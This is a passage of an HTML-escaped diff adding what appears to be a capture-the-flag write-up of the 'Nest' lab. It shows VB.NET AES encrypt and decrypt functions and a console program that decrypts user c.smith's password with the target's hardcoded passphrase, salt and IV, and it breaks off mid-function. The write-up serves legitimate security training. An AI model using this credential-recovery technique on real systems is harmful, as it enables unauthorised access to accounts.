+&lt;span class="code-line"&gt;                                    &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;passwordIterations&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;initVector&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;keySize&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                          &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;initVectorBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;saltValueBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;plainTextBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;Rfc2898DeriveBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                          &lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                          &lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;keyBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;CInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;symmetricKey&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CipherMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CBC&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;encryptor&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="n"&gt;ICryptoTransform&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateEncryptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Using&lt;/span&gt; &lt;span class="n"&gt;memoryStream&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;Using&lt;/span&gt; &lt;span class="n"&gt;cryptoStream&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                            &lt;span class="n"&gt;encryptor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                            &lt;span class="n"&gt;CryptoStreamMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FlushFinalBlock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;cipherTextBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToArray&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="n"&gt;Convert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Using&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Using&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;Public&lt;/span&gt; &lt;span class="k"&gt;Shared&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt; &lt;span class="nf"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;passPhrase&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;saltValue&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                    &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;passwordIterations&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;initVector&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  &lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;keySize&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                          &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;initVectorBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;initVectorBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;initVector&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;saltValueBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;saltValueBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saltValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;cipherTextBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cipherTextBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Convert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;Rfc2898DeriveBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                          &lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                          &lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;keyBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;keyBytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;CInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;symmetricKey&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CipherMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CBC&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;decryptor&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="n"&gt;ICryptoTransform&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;decryptor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateDecryptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;memoryStream&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;memoryStream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;cryptoStream&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cryptoStream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;New&lt;/span&gt; &lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                        &lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                        &lt;span class="n"&gt;CryptoStreamMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;plainTextBytes&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;ReDim&lt;/span&gt; &lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;decryptedByteCount&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;decryptedByteCount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                              &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                              &lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Dim&lt;/span&gt; &lt;span class="n"&gt;plainText&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;plainText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                            &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
+&lt;span class="code-line"&gt;                                            &lt;span class="n"&gt;decryptedByteCount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="n"&gt;plainText&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Class&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We fire up a Windows Box, install Microsoft Visual Basic 2010 Express and create
+a new "Application Console project" with a simple module to decode the c.smith
+password we got in the XML file.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="creating a Application Console project" src="/media/2020.06/nest_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;The code is the following. As the console is disappearing just after the run I
+put a second print and run the program in debug mode.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;Imports&lt;/span&gt; &lt;span class="nn"&gt;System.Text&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;Imports&lt;/span&gt; &lt;span class="nn"&gt;System.Security.Cryptography&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;Module&lt;/span&gt; &lt;span class="nn"&gt;Module1&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;Sub&lt;/span&gt; &lt;span class="nf"&gt;Main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;N3st22&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;88552299&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;464R5DFA5DL6LE28&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;End&lt;/span&gt; &lt;span class="k"&gt;Sub&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;Public&lt;/span&gt; &lt;span class="k"&gt;Function&lt;/span&gt; &lt;span class="nf"&gt;Decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;ByVal&lt;/span&gt; &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="ow"&gt;As&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; _&lt;/span&gt;
